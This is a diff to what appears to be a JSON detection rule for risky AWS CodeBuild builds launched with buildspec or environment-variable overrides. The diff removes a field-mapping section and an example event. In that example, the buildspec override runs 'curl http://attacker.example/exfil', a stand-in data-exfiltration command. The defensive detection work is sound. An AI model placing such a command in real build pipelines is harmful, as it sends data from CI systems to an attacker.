@@ -31,31 +31,6 @@
       "The override event alone does not confirm successful malicious execution."
     ]
   },
-  "dataModeling": {
-    "rawToNormalized": [
-      {
-        "rawPath": "requestParameters.projectName",
-        "normalizedPath": "aws.codebuild.project.name",
-        "notes": "Project launched with overrides"
-      },
-      {
-        "rawPath": "requestParameters.buildspecOverride",
-        "normalizedPath": "aws.codebuild.request.buildspec_override",
-        "notes": "Command path override"
-      },
-      {
-        "rawPath": "requestParameters.environmentVariablesOverride",
-        "normalizedPath": "aws.codebuild.request.environment_variables_override",
-        "notes": "Runtime variable override"
-      },
-      {
-        "rawPath": "userIdentity.arn",
-        "normalizedPath": "user.arn",
-        "notes": "Actor launching the risky build"
-      }
-    ],
-    "exampleNormalizedEvent": "{\n  \"@timestamp\": \"2025-02-10T12:45:00Z\",\n  \"event\": {\n    \"category\": [\n      \"process\"\n    ],\n    \"type\": [\n      \"start\"\n    ],\n    \"action\": \"StartBuild\",\n    \"outcome\": \"success\",\n    \"provider\": \"aws\"\n  },\n  \"user\": {\n    \"arn\": \"arn:aws:iam::123456789012:user/dev\",\n    \"type\": \"IAMUser\"\n  },\n  \"aws\": {\n    \"codebuild\": {\n      \"project\": {\n        \"name\": \"target\"\n      },\n      \"request\": {\n        \"buildspec_override\": \"version: 0.2\\nphases:\\n  build:\\n    commands:\\n      - curl http://attacker.example/exfil\"\n      }\n    }\n  }\n}"
-  },
   "enrichment": [
     {
       "dimension": "Override Authorization",
